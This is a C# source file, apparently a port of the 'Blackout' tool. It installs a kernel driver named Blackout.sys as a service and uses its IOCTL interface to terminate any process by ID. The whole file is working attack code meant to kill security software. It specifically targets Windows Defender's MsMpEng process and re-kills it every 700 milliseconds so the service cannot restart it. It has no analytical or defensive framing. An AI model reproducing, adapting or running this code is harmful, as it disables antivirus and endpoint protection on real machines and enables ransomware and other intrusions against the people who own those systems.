using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    // IOCTL codes
    const uint INITIALIZE_IOCTL_CODE = 0x9876C004;
    const uint TERMINSTE_PROCESS_IOCTL_CODE = 0x9876C094;

    // Service-related constants
    const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
    const uint SERVICE_KERNEL_DRIVER = 0x00000001;
    const uint SERVICE_DEMAND_START = 0x00000003;
    const uint SERVICE_ERROR_IGNORE = 0x00000000;
    const uint SERVICE_ALL_ACCESS = 0xF01FF;

    // P/Invoke declarations for driver communication
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        ref uint lpInBuffer,
        uint nInBufferSize,
        [Out] byte[] lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    // P/Invoke declarations for service functions
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr OpenSCManagerA(
        string lpMachineName,
        string lpDatabaseName,
        uint dwDesiredAccess
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr OpenServiceA(
        IntPtr hSCManager,
        string lpServiceName,
        uint dwDesiredAccess
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool QueryServiceStatus(
        IntPtr hService,
        out SERVICE_STATUS lpServiceStatus
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool StartServiceA(
        IntPtr hService,
        uint dwNumServiceArgs,
        IntPtr lpServiceArgVectors
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr CreateServiceA(
        IntPtr hSCManager,
        string lpServiceName,
        string lpDisplayName,
        uint dwDesiredAccess,
        uint dwServiceType,
        uint dwStartType,
        uint dwErrorControl,
        string lpBinaryPathName,
        string lpLoadOrderGroup,
        IntPtr lpdwTagId,
        string lpDependencies,
        string lpServiceStartName,
        string lpPassword
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CloseServiceHandle(IntPtr hSCObject);

    [StructLayout(LayoutKind.Sequential)]
    struct SERVICE_STATUS
    {
        public uint dwServiceType;
        public uint dwCurrentState;
        public uint dwControlsAccepted;
        public uint dwWin32ExitCode;
        public uint dwServiceSpecificExitCode;
        public uint dwCheckPoint;
        public uint dwWaitHint;
    }

    // Translated LoadDriver function.
    // It looks for an existing service named "Blackout". If found, it queries its status and starts it if stopped.
    // Otherwise, it creates the service using the provided full driver path and starts it.
    static bool LoadDriver(string driverPath)
    {
        const string serviceName = "Blackout";

        // Open the Service Control Manager
        IntPtr hSCM = OpenSCManagerA(null, null, SC_MANAGER_ALL_ACCESS);
        if (hSCM == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open Service Control Manager.");
            return false;
        }

        // Check if the service already exists
        IntPtr hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
        if (hService != IntPtr.Zero)
        {
            Console.WriteLine("Service already exists.");

            // Query service status
            if (!QueryServiceStatus(hService, out SERVICE_STATUS status))
            {
                Console.WriteLine("Failed to query service status.");
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return false;
            }

            // If service is stopped, start it (SERVICE_STOPPED == 1)
            if (status.dwCurrentState == 1)
            {
                if (!StartServiceA(hService, 0, IntPtr.Zero))
                {
                    Console.WriteLine("Failed to start service.");
                    CloseServiceHandle(hService);
                    CloseServiceHandle(hSCM);
                    return false;
                }
                Console.WriteLine("Starting service...");
            }

            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }

        // Service doesn't exist; create it.
        hService = CreateServiceA(
            hSCM,
            serviceName,
            serviceName,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            driverPath,
            null,
            IntPtr.Zero,
            null,
            null,
            null
        );

        if (hService == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create service.");
            CloseServiceHandle(hSCM);
            return false;
        }

        Console.WriteLine("Service created successfully.");

        // Start the newly created service.
        if (!StartServiceA(hService, 0, IntPtr.Zero))
        {
            Console.WriteLine("Failed to start service.");
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
        Console.WriteLine("Starting service...");

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true;
    }

    // CheckProcess returns true if a process with the given process ID exists.
    static bool CheckProcess(uint processId)
    {
        try
        {
            Process.GetProcessById((int)processId);
            return true;
        }
        catch
        {
            return false;
        }
    }

    // GetPID returns the process ID for the first process matching the given name.
    static uint GetPID(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            return (uint)processes[0].Id;
        }
        return 0;
    }

    static void Main(string[] args)
    {
        // Validate command-line arguments.
        if (args.Length != 2 || args[0] != "-p")
        {
            Console.WriteLine("Invalid number of arguments. Usage: Blackout.exe -p <process_id>");
            return;
        }

        if (!uint.TryParse(args[1], out uint processId))
        {
            Console.WriteLine("Invalid process id provided.");
            return;
        }

        if (!CheckProcess(processId))
        {
            Console.WriteLine("Provided process id doesn't exist!");
            return;
        }

        // Locate the driver file ("Blackout.sys") in the current directory.
        string driverFile = "Blackout.sys";
        if (!File.Exists(driverFile))
        {
            Console.WriteLine("Driver file not found!");
            return;
        }

        string fullDriverPath = Path.GetFullPath(driverFile);
        Console.WriteLine($"Driver path: {fullDriverPath}");
        Console.WriteLine($"Loading {driverFile} driver ..");

        if (!LoadDriver(fullDriverPath))
        {
            Console.WriteLine("Failed to load driver, try running the program as administrator!");
            return;
        }
        Console.WriteLine("Driver loaded successfully!");

        // Open a handle to the driver using its symbolic link.
        IntPtr hDevice = CreateFile(@"\\.\Blackout", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
        {
            Console.WriteLine("Failed to open handle to driver!");
            return;
        }

        // Send the INITIALIZE_IOCTL_CODE command with the process ID.
        uint input = processId;
        byte[] output = new byte[8]; // buffer for output (adjust size as needed)
        if (!DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out uint bytesReturned, IntPtr.Zero))
        {
            Console.WriteLine($"Failed to send initializing request 0x{INITIALIZE_IOCTL_CODE:X}!");
            CloseHandle(hDevice);
            return;
        }
        Console.WriteLine($"Driver initialized 0x{INITIALIZE_IOCTL_CODE:X}!");

        // If the target process ID matches Windows Defender's process, repeatedly send termination IOCTL.
        uint defenderPid = GetPID("MsMpEng");
        if (defenderPid == processId)
        {
            Console.WriteLine("Terminating Windows Defender ..");
            Console.WriteLine("Keep the program running to prevent the service from restarting it");
            bool once = true;
            while (true)
            {
                input = GetPID("MsMpEng");
                if (input != 0)
                {
                    if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out bytesReturned, IntPtr.Zero))
                    {
                        Console.WriteLine($"DeviceIoControl failed. Error: 0x{Marshal.GetLastWin32Error():X}");
                        break;
                    }
                    if (once)
                    {
                        Console.WriteLine("Defender Terminated ..");
                        once = false;
                    }
                }
                Thread.Sleep(700);
            }
        }

        Console.WriteLine("Terminating process ..");
        if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out bytesReturned, IntPtr.Zero))
        {
            Console.WriteLine($"Failed to terminate process: 0x{Marshal.GetLastWin32Error():X}!");
        }
        else
        {
            Console.WriteLine("Process has been terminated!");
        }

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
        CloseHandle(hDevice);
    }
}
